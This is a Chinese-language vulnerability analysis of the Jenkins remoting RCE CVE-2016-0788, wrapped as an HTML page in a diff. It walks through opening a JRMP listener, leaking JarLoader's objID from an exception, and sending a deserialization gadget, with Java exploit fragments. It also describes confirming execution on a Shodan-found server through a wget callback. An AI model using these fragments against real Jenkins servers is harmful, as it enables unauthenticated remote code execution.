@@ -1,0 +1,321 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Jenkins RCE 2(CVE-2016-0788)分析及利用 - 为程序员服务</title>
+    <meta charset="utf-8">
+
+
+<link rel="stylesheet" type="text/css" href="../css/style.css">
+            </head>
+<body>
+<h1>Jenkins RCE 2(CVE-2016-0788)分析及利用 - 为程序员服务</h1>
+
+<p>
+ <strong>
+  Author：隐形人真忙
+ </strong>
+</p>
+<h1>
+ 0x00 概述
+</h1>
+<hr/>
+<p>
+ 国外的安全研究人员Moritz Bechler在2月份发现了一处Jenkins远程命令执行漏洞，该漏洞无需登录即可利用，也就是CVE-2016-0788。官方公告是这样描述此漏洞的：
+</p>
+<blockquote>
+ <p>
+  A vulnerability in the Jenkins remoting module allowed unauthenticated remote attackers to open a JRMP listener on the server hosting the Jenkins master process, which allowed arbitrary code execution.
+ </p>
+</blockquote>
+<p>
+ 在分析这个漏洞的时候，运用到了Java RPC知识以及反序列化的问题，并且这个漏洞利用的tricks和攻击执行链路都比较有趣，因此发出来漏洞分析分享一下。
+</p>
+<h1>
+ 0x01 基本知识
+</h1>
+<hr/>
+<p>
+ Jenkins Remoting的相关API是用于实现分布式环境中master和slave节点或者用于访问CLI的。在访问Jenkins页面时，Remoting端口就会在header中找到：
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/b10acb49a468cc24e40a.png" onerror="return imgError(this)">
+</p>
+<p>
+ Remoting端口默认是非认证下即可访问，虽然这个端口是动态的，但是可以从Response的头部信息中获取到。
+</p>
+<p>
+ 早在去年11月份，breenmachine发布的博客中提及到了这个CLI端口，并且漏洞的触发也是经过了这个端口的反序列化来触发，jenkins也进行了修复。
+</p>
+<p>
+ 然而，CVE-2016-0788利用了一些技巧，通过Jenkins Remoting巧妙地开启JRMP，从JRMP对反序列化进行触发，从而完成exploit。
+</p>
+<p>
+ JRMP是Java RMI中支持的其中一个协议，其中也包含了反序列化的功能，实际上，任何Java RPC涉及到按值传递的问题，基本都会采用序列化对象的方式进行实现。下面来看看这个漏洞具体的内容。
+</p>
+<h1>
+ 0x02 漏洞原理
+</h1>
+<hr/>
+<p>
+ 这里首先不得不说一下Jenkins是如何防止反序列化命令执行产生的，在Jenkins-remoting中，有一个ClassFilter类，这个类中定义的一些classpath黑名单，这个黑名单目前看起来是这样的。
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/b461fac055ff2ae3807d.png" onerror="return imgError(this)">
+</p>
+<p>
+ 都是已知的一些比较著名的gadget。在该漏洞被报告时，官方对这个黑名单进行了完善：
+</p>
+<p>
+ <a href="https://github.com/jenkinsci/remoting/commit/baa0cef36081711d216532d562e02e2fc425d310">
+  https://github.com/jenkinsci/remoting/commit/baa0cef36081711d216532d562e02e2fc425d310
+ </a>
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/d3af7a7b5f09bdc89150.png" onerror="return imgError(this)">
+</p>
+<p>
+ 主要针对的RMI相关的类进行了黑名单完善。多插一句，黑名单机制是基于ObjectInputStream扩展出来的一个类ObjectInputStreamEx来实现的：
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/354529564c727ea71a25.png" onerror="return imgError(this)">
+</p>
+<p>
+ 这里调用了filter对象的check方法，可以去看看相关方法，在hudson.remoting.ClassFilter，文件中的isBlacklisted默认返回false，具体的黑名单机制在RegExpClassFilter中进行实现，子类重写了父类的isBlacklisted方法，增加黑名单校验。
+</p>
+<p>
+ 虽然Jenkins的黑名单暂时有效，但是这种机制本身不可靠，因为无法防止潜在的反序列化执行的gadget。
+</p>
+<p>
+ 扯远了，我们回到正题。官方针对该漏洞还commit了一个单元测试类，以下的分析都是基于这个单元测试文件中的代码进行说明。
+</p>
+<p>
+ 通过分析代码，可以看出Moritz Bechler（漏洞发现者）的思路大致如下：
+</p>
+<ol>
+ <li>
+  <p>
+   首先连接CLI端口进行通讯
+  </p>
+ </li>
+ <li>
+  <p>
+   然后通过Jenkins Remoting在服务器端打开一个JRMP Listener
+  </p>
+ </li>
+ <li>
+  <p>
+   攻击者客户端连接到这个打开的JRMP端口，通过该端口发送恶意构造的gadget，从而触发漏洞。
+  </p>
+ </li>
+ <li>
+  <p>
+   以上的操作不涉及Jenkins认证。
+  </p>
+ </li>
+</ol>
+<p>
+ 思路有了，但是还需要解决如下问题：
+</p>
+<ol>
+ <li>
+  <p>
+   如何使得服务器端打开JRMP端口
+  </p>
+ </li>
+ <li>
+  <p>
+   即使打开JRMP，由于JRMP机制运行在默认的classpath，即使gadget被顺利反序列化，也会因为找不到相关的classpath而无法进行触发
+  </p>
+ </li>
+ <li>
+  <p>
+   如何通过JRMP协议来执行反序列化操作。
+  </p>
+ </li>
+</ol>
+<p>
+ 下面通过代码一一进行说明。
+</p>
+<h1>
+ 0x03 通过JRMP进行反序列化
+</h1>
+<p>
+ 首先需要让服务器端打开一个JRMP端口，来接收我们后续的反序列化执行对象。这里通过构造一个远程对象进行实现。
+</p>
+<p>
+ 相关代码如下：
+</p>
+<pre><code>//打开JRMP Listener
+            //获取一个UnicastRemoteObject,使得服务器端按要求绑定12345的JRMP端口
+            Constructor&lt;UnicastRemoteObject&gt; uroC = UnicastRemoteObject.class.getDeclaredConstructor();
+            uroC.setAccessible(true);
+            ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
+            Constructor&lt;?&gt; sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);
+            sc.setAccessible(true);
+            UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance();   
+
+            //设置JRMP端口
+            Field portF = UnicastRemoteObject.class.getDeclaredField("port");
+            portF.setAccessible(true);
+            portF.set(uro, jrmpPort);
+           //设置骨架对象           
+           Field f = RemoteObject.class.getDeclaredField("ref");
+            f.setAccessible(true);
+            //监听JRMP端口
+            f.set(uro, new UnicastRef2(new LiveRef(new ObjID(2), new TCPEndpoint("localhost", jrmpPort), true)));
+</code></pre>
+<p>
+ 这里运用了反射机制创建一个UnicastRemoteObject的远程对象，并通过设置该对象的ref属性来设置这个远程对象的代理对象。
+</p>
+<p>
+ 通过Jenkins Remoting，我们可以将这个远程对象连同这个对象的代理对象部署到服务器端，即使得服务器端打开一个JRMP Listener来监听我们制定的端口，后续工作就是向这个端口发送恶意数据来实现exploit。
+</p>
+<h1>
+ 0x04 修改classLoader
+</h1>
+<hr/>
+<p>
+ 根据上文所述，JRMP使用的是默认的classLoader，是无法识别反序列化gadget对象的，Commons-collection1，etc. 因此，为了反序列化能够顺利执行命令，我们需要修改JRMP的classLoader为jenkins的JarLoader，但是本地无法直接去查找服务器端中的JarLoader。
+</p>
+<p>
+ 在远程方法调用时，需要使用objID对远程对象进行标识，这个objID是随机生成的，爆破是不太可能的。这里用了一个非常有趣的trick，即使用一个异常来获取到JarLoader的objID号，然后根据ID在服务器端获取到这个JarLoader。
+</p>
+<p>
+ 具体就是调用hudson.remoting.JarLoader中的isPresentOnRemote方法：
+</p>
+<p>
+ 代码如下：
+</p>
+<pre><code>//创建一个RPCRequest对象
+            //即执行Checksum类中的isPresentOnRemote方法
+            Object o = reqCons
+                    .newInstance(oid, JarLoader.class.getMethod("isPresentOnRemote", Class.forName("hudson.remoting.Checksum")), new Object[] {
+                        uro,
+            }); 
+
+            try {
+                //在服务器端调用JarLoader.isPresentOnRemote(Checksum)
+                //会报错出JarLoader的objID
+                c.call((Callable&lt;Object,Exception&gt;) o);
+            }
+            catch ( Exception e ) {
+//从异常信息中获取JarLoader的objID
+</code></pre>
+<p>
+ 其中传入一个Checksum的对象。由于JarLoader是抽象类，调用抽象方法会报错，报错信息为：
+</p>
+<pre><code>hudson.remoting.RemotingSystemException: failed to invoke public abstract boolean hudson.remoting.JarLoader.isPresentOnRemote(hudson.remoting.Checksum) on hudson.remoting.JarLoaderImpl@14e33708[ActivationGroupImpl[UnicastServerRef [liveRef: [endpoint:[127.0.1.1:12345](local),objID:[-72a49a0d:15381b90378:-7fec, 3478390807499336137]]]]]    
+
+at hudson.remoting.RemoteInvocationHandler$RPCRequest.perform(RemoteInvocationHandler.java:610) 
+
+at hudson.remoting.RemoteInvocationHandler$RPCRequest.call(RemoteInvocationHandler.java:583)    
+
+........
+</code></pre>
+<p>
+ 可以看到，这里的报错信息中包含了JarLoader的objID号，通过这个ID可以获取到JarLoader在服务器端的实例。
+</p>
+<h1>
+ 0x05 发送gadget
+</h1>
+<hr/>
+<p>
+ JRMP是RMI中支持的协议之一，向JRMP发送一个对象执行也需要遵循一定的协议，通过阅读RMI实现的源码探究一下原理：
+</p>
+<p>
+ 首先看一下sun.rmi.*下的TCPChannel类。
+</p>
+<p>
+ 1.协议头固定形式
+</p>
+<p>
+ 写入传输头部的操作：
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/fff039b2615d7e85eb16.png" onerror="return imgError(this)">
+</p>
+<p>
+ 只需要写入Magic和Version字段即可。
+</p>
+<p>
+ 2.调用远程对象方法
+</p>
+<p>
+ 写入传输字段TransportConstants.Call，用来调用远程对象方法，所以具体看看协议的流程是什么。相关代码在sun.rmi.transport.StreamRemoteCall类中。
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/2a8ed2a4b8664d9b5d5b.png" onerror="return imgError(this)">
+</p>
+<p>
+ 在StreamRemoteCall中就有关于方法调用的操作。首先写入TransportConstants.Call字段，标明下面的操作。然后写入对象id，方法索引以及桩对象或者骨架对象的hash，因为JAVA RMI实现中，本地程序与远程主机的方法调用与沟通，实际上是由桩对象和骨架对象进行代理，如果明白Java的动态代理机制，会更好理解，这里就不赘述RMI实现原理了，有兴趣的可以自行搜索相关资料。
+</p>
+<p>
+ 相关exploit代码如下：
+</p>
+<pre><code>//写入objID
+objOut.writeLong(obj);
+objOut.writeInt(o1);
+objOut.writeLong(o2);
+objOut.writeShort(o3);  
+
+//调用方法索引
+objOut.writeInt(-1);
+
+//stub对象的hash         objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod("newInstance", ActivationID.class, ActivationDesc.class)));
+
+//发送反序列化payload
+final Object object = payload.getObject(payloadArg);
+objOut.writeObject(object);
+</code></pre>
+<p>
+ 以上代码的作用就是与JRMP按照协议进行通讯，将反序列化对象发送至服务器端执行的过程。有兴趣的可以结合RMI实现源码进行阅读。
+</p>
+<h1>
+ 0x06 攻击exploit
+</h1>
+<hr/>
+<p>
+ 根据测试代码，我们不难写出攻击的exploit。从shodan上搜一台Jenkins机器，该机器不存在去年那个粗暴的Jenkins反序列化命令执行漏洞。
+</p>
+<p>
+ 我们结合cloudeye，执行wget命令验证。
+</p>
+<p>
+ 效果如下：
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/7733743a4f32720b2915.jpeg" onerror="return imgError(this)">
+</p>
+<p>
+ 同时，可以在cloudeye上看到结果：
+</p>
+<p>
+ <img  alt="" src="http://www.evil0x.com/wp-content/uploads/2016/07/ddbb017968f41b875c94.png" onerror="return imgError(this)">
+</p>
+<p>
+ 为了防止有人刷洞，暂不公开exploit，有能力研究的其实也不难获取到exploit。
+</p>
+<h2>
+ 参考链接
+</h2>
+<ul>
+ <li>
+  <a href="https://github.com/jenkinsci/remoting/tree/master/src/main/java/hudson/remoting">
+   https://github.com/jenkinsci/remoting/tree/master/src/main/java/hudson/remoting
+  </a>
+ </li>
+ <li>
+  <a href="https://github.com/jenkinsci/remoting/commit/baa0cef36081711d216532d562e02e2fc425d310">
+   https://github.com/jenkinsci/remoting/commit/baa0cef36081711d216532d562e02e2fc425d310
+  </a>
+ </li>
+ <li>
+  <a href="https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-02-24">
+   https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-02-24
+  </a>
+ </li>
+</ul>
+
+</body>
+</html>
